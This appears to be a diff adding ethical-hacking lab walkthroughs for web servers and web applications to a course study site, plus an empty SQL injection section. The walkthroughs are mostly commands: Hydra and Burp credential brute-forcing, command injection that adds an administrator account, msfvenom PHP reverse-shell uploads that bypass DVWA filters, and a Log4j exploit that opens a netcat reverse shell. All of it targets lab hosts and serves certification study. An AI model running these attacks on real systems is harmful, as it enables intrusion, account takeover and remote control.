@@ -27,6 +27,9 @@
             <li><a href="module_10.html" id="nav-10">MOD_10_DOS</a></li>
             <li><a href="module_11.html" id="nav-11">MOD_11_SESS</a></li>
             <li><a href="module_12.html" id="nav-12">MOD_12_EVADE</a></li>
+            <li><a href="module_13.html" id="nav-13">MOD_13_WEBSRV</a></li>
+            <li><a href="module_14.html" id="nav-14">MOD_14_WEBAPP</a></li>
+            <li><a href="module_15.html" id="nav-15">MOD_15_SQLI</a></li>
             <li><a href="cheat_sheet.html" id="nav-cheat">CHEAT_SHEET</a></li>
         </ul>
         <button id="themeToggle" class="theme-toggle">SWITCH_MODE</button>
@@ -2598,7 +2601,563 @@ bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.e
 # BITSAdmin transfers the file; verify in File Explorer -&gt; C:\Exploit.exe
 # attacker can then use the file for access/privilege escalation
 # close all windows and document all acquired information
-</code></pre>            </div></section>
+</code></pre>            </div></section>            <section class="lab-task"><h3>Module 13 — Hacking Web Servers</h3><div class="section-card">                <p><strong>Information Gathering using Ghost Eye</strong> <span class="tool-tag">Ghost Eye / Python 3 / Parrot Security / MATE Terminal</span></p>                <pre><code># Parrot Security machine
+# login: attacker / toor (password not visible)
+# open MATE Terminal; run as root
+sudo su
+# password: toor
+
+# navigate to Ghost Eye directory
+cd ghost_eye
+
+# install dependencies
+pip3 install -r requirements.txt
+
+# launch Ghost Eye
+python3 ghost_eye.py
+
+# Ghost Eye menu appears
+# Whois Lookup: type 3, press Enter
+# Enter Domain or IP Address: certifiedhacker.com
+# scroll up to observe domain info
+
+# DNS Lookup: type 2, press Enter
+# Enter Domain or IP Address: certifiedhacker.com
+# scroll up to view DNS result
+
+# Clickjacking Test: type 6, press Enter
+# Enter the Domain to test: certifiedhacker.com
+# reveals web server architecture and Clickjacking vulnerability status
+
+# (optional) use other tools: Nmap port scan, HTTP header grabber, Link grabber, Robots.txt scanner
+# close all windows on Parrot Security when done
+</code></pre>                <p><strong>Perform Web Server Reconnaissance using Skipfish</strong> <span class="tool-tag">Skipfish / Parrot Security / Windows Server 2022 (WAMP) / Firefox</span></p>                <pre><code># Windows Server 2022 machine
+# login: CEH\Administrator / Pa$$w0rd
+# start WAMP Server
+# Type here to search -&gt; wamp -&gt; Wamperserver64 -&gt; Enter
+# wait until WAMP icon turns Green in Notification area
+# leave Windows Server 2022 running
+
+# Parrot Security machine
+# open MATE Terminal; run as root
+sudo su
+# password: toor
+
+# perform security reconnaissance with Skipfish
+skipfish -o /home/attacker/test -S /usr/share/skipfish/dictionaries/complete.wl http://[IP Address of Windows Server 2022]:8080
+# [IP Address of Windows Server 2022] e.g. 10.10.1.22
+
+# press Enter at the tips screen to start
+# let scan run for 5 minutes, then press Ctrl+C to terminate
+
+# view report
+# Places -&gt; Home Folder -&gt; double-click test folder
+# right-click index.html -&gt; Open With -&gt; Firefox
+
+# analyze an issue: click a node under Issue type overview (e.g., SQL query or similar syntax in parameters)
+# click the URL; view PHP version webpage details
+# switch back to first tab; click &quot;show trace&quot; next to URL to examine HTTP trace
+</code></pre>                <p><strong>Footprint a Web Server using the httprecon Tool</strong> <span class="tool-tag">httprecon / Windows 11 / www.certifiedhacker.com</span></p>                <pre><code># Windows 11 machine
+# login: Admin / Pa$$w0rd
+# click Ctrl+Alt+Delete (or via Resources pane / Commands menu)
+# Networks screen -&gt; Yes
+
+# navigate to httprecon
+# E:\CEH-Tools\CEHv12 Module 13 Hacking Web Servers\Web Server Footprinting Tools\httprecon
+# right-click httprecon.exe -&gt; Run as administrator (double-click to launch)
+# UAC: Yes
+
+# in Main window:
+# Target: website URL = www.certifiedhacker.com
+# Port: 80
+# click Analyze
+
+# observe footprint:
+# Get existing tab -&gt; server (e.g., nginx) used to develop the webpages
+# GET long request tab -&gt; lists all GET requests
+# Fingerprint Details tab -&gt; protocol name and version
+
+# close all open windows on Windows 11 when done
+</code></pre>                <p><strong>Footprint a Web Server using Netcat and Telnet</strong> <span class="tool-tag">Netcat / Telnet / Parrot Security / www.moviescope.com</span></p>                <pre><code># Parrot Security machine
+# open MATE Terminal; run as root
+sudo su
+# password: toor
+
+# banner grabbing with Netcat
+nc -vv www.moviescope.com 80
+# displays hosting information of the domain
+
+# send HTTP request (press Enter twice after the line)
+GET / HTTP/1.0
+
+# Netcat performs banner grabbing: content type, last modified date, accept ranges, ETag, server info
+
+# clear terminal
+clear
+
+# banner grabbing with Telnet
+telnet www.moviescope.com 80
+# Telnet connects to the domain
+
+# send HTTP request (press Enter twice)
+GET / HTTP/1.0
+
+# Telnet performs banner grabbing: content type, last modified date, accept ranges, ETag, server info
+
+# close terminal window on Parrot Security when done
+</code></pre>                <p><strong>Enumerate Web Server Information using Nmap Scripting Engine (NSE)</strong> <span class="tool-tag">Nmap / NSE / Parrot Security / www.goodshopping.com</span></p>                <pre><code># Parrot Security machine
+# open MATE Terminal; run as root
+sudo su
+# password: toor
+
+# enumerate directories used by web servers/web applications
+nmap -sV --script=http-enum www.goodshopping.com
+# enumerates and provides output details
+
+# discover hostnames that resolve the targeted domain
+nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- www.goodshopping.com
+
+# perform an HTTP trace on the targeted domain
+nmap --script http-trace -d www.goodshopping.com
+# detects a vulnerable server using TRACE method by sending HTTP TRACE request
+# shows whether TRACE method is enabled or not
+
+# check whether WAF/IPS/IDS is configured on the target host/domain
+nmap -p80 --script http-waf-detect www.goodshopping.com
+# scans host and attempts to determine whether a web server is monitored by IPS/IDS/WAF
+# probes target with malicious payloads and detects changes in response code
+
+# close terminal windows on Parrot Security when done
+</code></pre>                <p><strong>Uniscan Web Server Fingerprinting in Parrot Security</strong> <span class="tool-tag">Uniscan / Parrot Security / Windows Server 2022 (WAMP) / Firefox</span></p>                <pre><code># Windows Server 2022 machine
+# login: CEH\Administrator / Pa$$w0rd
+# start WAMP Server: Type here to search -&gt; wamp -&gt; Wamperserver64 -&gt; Enter
+# wait until WAMP icon turns Green; leave Windows Server 2022 running
+
+# Parrot Security machine
+# open MATE Terminal; run as root
+sudo su
+# password: toor
+
+# display Uniscan help options
+uniscan -h
+
+# directory scan (-q)
+uniscan -u http://10.10.1.22:8080/CEH -q
+# 10.10.1.22 = IP of Windows Server 2022 (may vary)
+# -u target URL; -q scan directories
+# takes ~5 minutes
+
+# file check: robots.txt and sitemap.xml (-we)
+uniscan -u http://10.10.1.22:8080/CEH -we
+# takes ~5 minutes
+
+# dynamic scan (-d): emails, source code disclosures, external hosts, web backdoors
+uniscan -u http://10.10.1.22:8080/CEH -d
+# takes ~18 minutes
+
+# view report
+# Places -&gt; Home Folder -&gt; File System -&gt; usr -&gt; share -&gt; uniscan -&gt; report
+# right-click 10.10.1.22.html -&gt; Open With -&gt; Firefox
+</code></pre>                <p><strong>Crack FTP Credentials using a Dictionary Attack</strong> <span class="tool-tag">Nmap / ftp / THC-Hydra / Parrot Security / Windows 11 (FTP) / Wordlists</span></p>                <pre><code># Parrot Security machine
+# open MATE Terminal; run as root
+sudo su
+# password: toor
+
+# scan target for FTP port (21)
+nmap -p 21 10.10.1.11
+# 10.10.1.11 = IP of Windows 11 (may vary)
+# observe port 21 is open
+
+# check FTP server is hosted (manual attempt)
+ftp 10.10.1.11
+# prompted for credentials; try random usernames/passwords (will fail)
+# close terminal window
+
+# prepare wordlists
+# Places -&gt; Desktop -&gt; navigate to CEHv12 Module 13 Hacking Web Servers folder
+# copy Wordlists folder (Ctrl+C) -&gt; paste on Desktop (Ctrl+V)
+
+# dictionary attack with THC-Hydra
+hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://10.10.1.11
+# -L username list; -P password list; target ftp://IP
+# Hydra tries combinations; outputs cracked credentials (e.g., Martin / apple)
+# may take some time
+
+# log in with cracked credentials
+ftp 10.10.1.11
+# Username: Martin
+# Password: apple
+# ftp terminal appears
+
+# create a directory remotely
+mkdir Hacked
+
+# verify on Windows 11: navigate to C:\FTP and view &quot;Hacked&quot; directory
+
+# list available FTP commands
+help
+
+# exit FTP terminal
+quit
+</code></pre>            </div></section>            <section class="lab-task"><h3>Module 14 — Hacking Web Applications</h3><div class="section-card">                <p><strong>Perform Web Application Reconnaissance using Nmap and Telnet</strong> <span class="tool-tag">Nmap / Telnet / Parrot Security / Windows Server 2019 / www.moviescope.com</span></p>                <pre><code># Parrot Security machine
+# login: attacker / toor
+# open MATE Terminal
+sudo su
+# password: toor
+
+cd
+
+# port and service discovery scan
+nmap -T4 -A -v www.moviescope.com
+# -T4: time template (0-5); -A: aggressive scan; -v: verbose output
+# observe open ports, services, OS, NetBIOS/DNS names, MAC
+
+# banner grabbing
+telnet www.moviescope.com 80
+# port 80 = HTTP
+# type (press Enter twice after):
+GET / HTTP/1.0
+# result: server name/version (e.g., Microsoft-IIS/10.0) and technology (e.g., ASP.NET)
+
+# close all windows when done
+</code></pre>                <p><strong>Perform Web Application Reconnaissance using WhatWeb</strong> <span class="tool-tag">WhatWeb / Parrot Security / www.moviescope.com</span></p>                <pre><code># Parrot Security machine
+sudo su
+# password: toor
+cd
+
+# list available commands
+whatweb
+
+# basic footprinting
+whatweb www.moviescope.com
+
+# verbose scan
+whatweb -v www.moviescope.com
+
+# export report to text file
+whatweb --log-verbose=MovieScope_Report www.moviescope.com
+# generates MovieScope_Report in root folder
+
+# open report
+pluma MovieScope_Report
+
+# close all windows when done
+</code></pre>                <p><strong>Perform Web Spidering using OWASP ZAP</strong> <span class="tool-tag">OWASP ZAP / Parrot Security / Windows Server 2019 / www.moviescope.com</span></p>                <pre><code># Parrot Security machine
+sudo su
+# password: toor
+cd
+
+# launch OWASP ZAP
+zaproxy
+# wait for init; when &quot;Do you want to persist ZAP Session?&quot; -&gt; select &quot;No, I do not want to persist this session&quot; -&gt; Start
+# if Manage Add-ons window appears, click Close
+
+# Automated Scan: URL to attack = www.moviescope.com; leave defaults; click Attack
+# observe URLs under Spider tab
+# after active scan, Alerts tab shows vulnerabilities/issues
+# Spider tab -&gt; URLs tab: hidden content/functionality links
+# Messages tab under Spider: detailed URL info
+
+# close all windows when done
+</code></pre>                <p><strong>Detect Load Balancers using Various Tools</strong> <span class="tool-tag">dig / lbd / Parrot Security / www.yahoo.com</span></p>                <pre><code># Parrot Security machine
+sudo su
+# password: toor
+cd
+
+# dig: resolve domain to multiple IPs (suggests load balancer)
+dig yahoo.com
+
+# lbd: detect DNS and HTTP load balancers
+lbd yahoo.com
+# analyzes Server/Date headers and differences between server answers
+
+# close all windows when done
+</code></pre>                <p><strong>Identify Web Server Directories using Various Tools</strong> <span class="tool-tag">Nmap (http-enum) / Gobuster / Dirsearch / Parrot Security / www.moviescope.com</span></p>                <pre><code># Parrot Security machine
+sudo su
+# password: toor
+cd
+
+# Nmap http-enum
+nmap -sV --script=http-enum www.moviescope.com
+# enumerates applications, directories, files exposed
+
+# copy common.txt wordlist to Desktop (from CEHv12 Module 14 folder) then:
+gobuster dir -u www.moviescope.com -w /home/attacker/Desktop/common.txt
+# dir: directory/file brute-forcing mode; -u: target URL; -w: wordlist
+
+# Dirsearch
+cd dirsearch/
+python3 dirsearch.py -u http://www.moviescope.com
+# -u: target URL
+
+# by extension
+python3 dirsearch.py -u http://www.moviescope.com -e aspx
+# -e: file extension
+
+# exclude status code 403
+python3 dirsearch.py -u http://www.moviescope.com -x 403
+# -x: exclude status code
+
+# close all windows when done
+</code></pre>                <p><strong>Perform Web Application Vulnerability Scanning using Vega</strong> <span class="tool-tag">Vega / Windows 11 / Windows Server 2022 (DVWA) / http://10.10.1.22:8080/dvwa</span></p>                <pre><code># Windows Server 2022 machine
+# login: CEH\Administrator / Pa$$w0rd
+# start WAMP: Type here to search -&gt; wampserver64 -&gt; Enter; wait for green icon
+
+# Windows 11 machine
+# login: Admin / Pa$$w0rd
+# Networks: Yes
+
+# launch Vega: Search -&gt; vega -&gt; Run as administrator -&gt; UAC Yes
+
+# Vega: Scan -&gt; Start New Scan
+# Select a Scan Target: Enter a base URI for scan = http://10.10.1.22:8080/dvwa -&gt; Next
+# Select Modules: double-click both checkboxes (Injection Modules, Response Processing Modules) -&gt; Next
+# Authentication Options: default -&gt; Next
+# Parameters: default -&gt; Finish
+# Follow Redirect? -&gt; Yes
+# wait for scan complete; expand Scan Alerts; view details (e.g., Cleartext Password over HTTP)
+
+# close all windows when done
+</code></pre>                <p><strong>Identify Clickjacking Vulnerability using ClickjackPoc</strong> <span class="tool-tag">ClickjackPoc / Parrot Security / Windows Server 2019 / www.moviescope.com</span></p>                <pre><code># Parrot Security machine
+sudo su
+# password: toor
+cd ClickjackPoc/
+
+# create domain file
+echo &quot;http://www.moviescope.com&quot; | tee domain.txt
+
+# run scan
+python3 clickJackPoc.py -f domain.txt
+# -f: file containing domain names
+
+# open generated PoC
+# Places -&gt; Home Folder -&gt; ClickjackPoc -&gt; right-click www.moviescope.com.html -&gt; Open With -&gt; Firefox
+
+# close all windows when done
+</code></pre>                <p><strong>Perform a Brute-force Attack using Burp Suite</strong> <span class="tool-tag">Burp Suite / Firefox / Parrot Security / Windows Server 2022 (WordPress) / Wordlists</span></p>                <pre><code># Windows Server 2022: start WAMP (green icon)
+
+# Parrot Security machine
+# Firefox: http://10.10.1.22:8080/CEH/wp-login.php?
+# Firefox proxy: Preferences -&gt; search proxy -&gt; Settings -&gt; Manual proxy 127.0.0.1:8080, Also use for FTP/HTTPS -&gt; OK
+
+# launch Burp: Applications -&gt; Pentesting -&gt; Web Application Analysis -&gt; Web Application Proxies -&gt; burpsuite
+# accept prompts; Temporary project; Use Burp defaults; Start Burp
+# Proxy -&gt; Intercept: Intercept is on
+
+# In browser: type random creds (admin/password) -&gt; Log In
+# Burp: request intercepted -&gt; right-click -&gt; Send to Intruder
+# Intruder -&gt; Positions: Clear §; Attack type: Cluster bomb
+# select username value -&gt; Add §; select password value -&gt; Add §
+# Payloads: set 1 Simple list -&gt; Load username.txt (/home/attacker/Desktop/CEHv12 Module 14 .../Wordlist)
+# set 2 Simple list -&gt; Load password.txt
+# Start attack -&gt; wait progress bar
+# look for Status=302, Length=1134 (differs) -&gt; cracked creds (example admin / qwerty@123)
+# close Intruder; Proxy -&gt; Intercept is off
+# remove browser proxy (No proxy); reload site; login with cracked creds
+
+# close all windows when done
+</code></pre>                <p><strong>Perform Parameter Tampering using Burp Suite</strong> <span class="tool-tag">Burp Suite / Firefox / Parrot Security / Windows Server 2019 / www.moviescope.com</span></p>                <pre><code># Parrot Security machine
+# Firefox: http://www.moviescope.com
+# Firefox proxy: Manual proxy 127.0.0.1:8080 (OK)
+
+# launch Burp; Temporary project; Use Burp defaults; Start Burp
+# Proxy -&gt; Intercept on
+
+# browser: login as sam / test -&gt; Log In
+# Burp: keep Forward until logged in
+# browser: click View Profile
+# Burp: keep Forward until HTTP request appears -&gt; Expand icon in INSPECTOR
+# Inspector: expand Query Parameters; double-click value; change VALUE from 1 to 2 -&gt; Apply Changes
+# Raw tab: turn Intercept off
+# browser: profile for ID=2 (John) appears although logged in as sam (ID=1)
+
+# remove proxy; close tab
+</code></pre>                <p><strong>Identify XSS Vulnerabilities in Web Applications using PwnXSS</strong> <span class="tool-tag">PwnXSS / Parrot Security / http://testphp.vulnweb.com</span></p>                <pre><code># Parrot Security machine
+sudo su
+# password: toor
+cd PwnXSS
+
+# scan target
+python3 pwnxss.py -u http://testphp.vulnweb.com
+# -u: target URL
+
+# copy any Query (GET) link under Detected XSS
+# Firefox: paste copied link -&gt; Enter (OK pop-up if appears)
+
+# close all windows when done
+</code></pre>                <p><strong>Exploit Parameter Tampering and XSS Vulnerabilities in Web Applications</strong> <span class="tool-tag">Firefox / Windows 11 / Windows Server 2019 / www.moviescope.com</span></p>                <pre><code># Windows 11 machine
+# Firefox: http://www.moviescope.com
+# Login: steve / password
+# View Profile -&gt; observe ID=4 in URL/info
+# change id=1 -&gt; Enter -&gt; profile of sam
+# change id=3 -&gt; Enter -&gt; profile of kety
+
+# Contacts tab: Name=steve; Comment = cross-site script (as in screenshot); Submit Comment
+# refresh Contacts page (Resend if prompted)
+
+# Windows Server 2019 machine
+# login: Administrator / Pa$$w0rd
+# Firefox/Chrome: http://www.moviescope.com
+# Login: sam / test (victim)
+# Contacts tab -&gt; alert &quot;You are Hacked&quot; pops up on page load
+
+# close all windows when done
+</code></pre>                <p><strong>Perform Cross-site Request Forgery (CSRF) Attack</strong> <span class="tool-tag">WPScan / Burp? / Firefox / Parrot Security / Windows Server 2022 (WordPress) / Security_Script.html</span></p>                <pre><code># Windows Server 2022: start WAMP
+# Browser: http://10.10.1.22:8080/CEH/wp-login.php?
+# Login: admin / qwerty@123
+# Plugins -&gt; Installed Plugins -&gt; activate leenk.me; click leenk.me in left pane
+# General Settings: tick Facebook checkbox -&gt; Save Settings; click Facebook Settings
+# Facebook Settings: Default Message: This is CEH lab.; Default Link Name: CEH.com; Default Caption: CEH Labs; clear Default Description; Save Settings
+
+# Parrot Security machine
+# Firefox: https://wpscan.com/register -&gt; register, confirm email, login, get API Token
+
+# Parrot terminal:
+sudo su
+# password: toor
+cd
+wpscan --api-token [API_TOKEN] --url http://10.10.1.22:8080/CEH --plugins-detection aggressive --enumerate vp
+# observe vulnerable plugins akismet and leenkme
+
+# copy Security_Script.html to shared folder (smb://10.10.1.11 CEH-Tools) then to Windows Server 2022 Desktop
+# Windows Server 2022: open Security_Script.html with Firefox (same browser as Step 6) -&gt; OK
+# redirected to Facebook Settings; field values changed -&gt; CSRF success
+
+# close all windows when done
+</code></pre>                <p><strong>Enumerate and Hack a Web Application using WPScan and Metasploit</strong> <span class="tool-tag">WPScan / Metasploit / msfconsole / Parrot Security / Windows Server 2022 (WordPress)</span></p>                <pre><code># Windows Server 2022: start WAMP
+
+# Parrot Security machine
+sudo su
+# password: toor
+cd
+
+# enumerate users
+wpscan --api-token [API_TOKEN] --url http://10.10.1.22:8080/CEH --enumerate u
+# note usernames (e.g., admin)
+
+# start PostgreSQL and msfconsole
+service postgresql start
+msfconsole
+
+# in msfconsole:
+use auxiliary/scanner/http/wordpress_login_enum
+show options
+set PASS_FILE &quot;/home/attacker/Desktop/CEHv12 Module 14 Hacking Web Applications/Wordlist/password.txt&quot;
+set RHOSTS 10.10.1.22
+set RPORT 8080
+set TARGETURI http://10.10.1.22:8080/CEH
+set USERNAME admin
+run
+# cracked password displayed (example qwerty@123)
+
+# login WordPress with cracked creds: http://10.10.1.22:8080/CEH/wp-login.php
+
+# close all windows when done
+</code></pre>                <p><strong>Exploit a Remote Command Execution Vulnerability to Compromise a Target Web Server</strong> <span class="tool-tag">DVWA / Firefox / Windows 11 / Windows Server 2022 / Command Injection</span></p>                <pre><code># Windows Server 2022: start WAMP
+
+# Windows 11 machine
+# Firefox: http://10.10.1.22:8080/dvwa/login.php
+# Login: gordonb / abc123
+# Command Injection -&gt; Enter IP 10.10.1.22 -&gt; Submit (ping)
+# Try: | hostname -&gt; Submit (error at Impossible security)
+# DVWA Security -&gt; set Low -&gt; Submit
+# Command Injection -&gt; | hostname -&gt; Submit (returns server name)
+# | whoami
+# | tasklist  (note a PID, e.g., 3112)
+# | Taskkill /PID 3112 /F
+# | dir C:\
+# | net user
+# | net user Test /Add
+# | net user Test
+# | net localgroup Administrators Test /Add
+# | net user Test  (confirm admin)
+
+# Windows 11: Remote Desktop Connection -&gt; Computer 10.10.1.22 -&gt; Show Options -&gt; User name test -&gt; Connect -&gt; (empty password) OK -&gt; Yes
+# close session when done
+
+# close all windows when done
+</code></pre>                <p><strong>Exploit a File Upload Vulnerability at Different Security Levels</strong> <span class="tool-tag">msfvenom / Metasploit / Burp Suite / DVWA / Parrot Security / Windows Server 2022</span></p>                <pre><code># Parrot Security machine
+sudo su
+# password: toor
+cd
+
+# generate payload (Low)
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=4444 -f raw
+# select payload -&gt; Copy
+cd /home/attacker/Desktop/
+pluma upload.php   # paste payload; save
+
+# DVWA: http://10.10.1.22:8080/dvwa/login.php (admin/password)
+# DVWA Security -&gt; Low
+# File Upload -&gt; Browse upload.php -&gt; Upload (note location)
+# msfconsole: use exploit/multi/handler
+# set payload php/meterpreter/reverse_tcp; set LHOST 10.10.1.13; set LPORT 4444; run
+# browser new tab: http://10.10.1.22:8080/dvwa/hackable/uploads/upload.php
+# Meterpreter session established -&gt; sysinfo
+
+# Medium level
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=3333 -f raw
+# copy; cd Desktop; pluma medium.php.jpg (paste; save)
+# DVWA Security -&gt; Medium; File Upload -&gt; select medium.php.jpg
+# configure Firefox proxy 127.0.0.1:8080; launch Burp; Intercept on
+# Upload -&gt; Burp: change filename medium.php.jpg -&gt; medium.php; Forward; Intercept off
+# remove proxy; note upload location
+# msfconsole: use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST 10.10.1.13; set LPORT 3333; run
+# browser: http://10.10.1.22:8080/dvwa/hackable/uploads/medium.php -&gt; session -&gt; sysinfo
+
+# High level
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=2222 -f raw
+# copy; cd Desktop; pluma high.jpeg (paste; add &quot;GIF98&quot; first line; save)
+# DVWA Security -&gt; High; File Upload -&gt; select high.jpeg -&gt; Upload (note location)
+# Command Injection: |copy C:\wamp64\www\DVWA\hackable\uploads\high.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php -&gt; Submit
+# msfconsole: use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST 10.10.1.13; set LPORT 2222; run
+# browser: http://10.10.1.22:8080/dvwa/hackable/uploads/shell.php -&gt; session -&gt; sysinfo
+
+# close all windows when done
+</code></pre>                <p><strong>Gain Access by Exploiting Log4j Vulnerability</strong> <span class="tool-tag">Log4j / Docker / Ubuntu / Parrot Security / poc.py / Netcat</span></p>                <pre><code># Ubuntu machine
+# login: Ubuntu / toor
+# Terminal: sudo su (toor)
+sudo apt-get update
+sudo apt-get install docker.io
+cd log4j-shell-poc/
+docker build -t log4j-shell-poc .
+docker run --network host log4j-shell-poc
+# leave server running
+
+# Parrot Security machine
+# Firefox: http://10.10.1.9:8080  (verify vuln server running)
+
+# Terminal 1 (root):
+sudo su
+# password: toor
+cd log4j-shell-poc
+pluma poc.py
+# edit line 62: jdk1.8.0_20/bin/javac -&gt; /usr/bin/jdk1.8.0_202/bin/javac
+# edit line 87: jdk1.8.0_20/bin/java -&gt; /usr/bin/jdk1.8.0_202/bin/java
+# edit line 99: jdk1.8.0_20/bin/java -&gt; /usr/bin/jdk1.8.0_202/bin/java
+# save and close
+
+# Terminal 2 (root): extract JDK
+sudo su
+# password: toor
+tar -xf jdk-8u202-linux-x64.tar.gz
+mv jdk1.8.0_202 /usr/bin/
+
+# Terminal 3 (root): netcat listener
+sudo su
+# password: toor
+nc -lvp 9001
+
+# Terminal 1: run exploit
+python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001
+# copy payload from &quot;send me:&quot; section
+
+# Firefox: paste payload into Username field; Password: password; click Login
+# netcat listener: reverse shell opened
+# pwd ; whoami  (root)
+
+# close all windows when done
+</code></pre>            </div></section>            <section class="lab-task"><h3>Module 15 — SQL Injection</h3><div class="section-card">            </div></section>
         </div>
     </main>
     <script>
@@ -2643,6 +3202,9 @@ bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.e
             'module_10.html': 'nav-10',
             'module_11.html': 'nav-11',
             'module_12.html': 'nav-12',
+            'module_13.html': 'nav-13',
+            'module_14.html': 'nav-14',
+            'module_15.html': 'nav-15',
             'cheat_sheet.html': 'nav-cheat'
         };
         const navId = navMap[path] || 'nav-index';
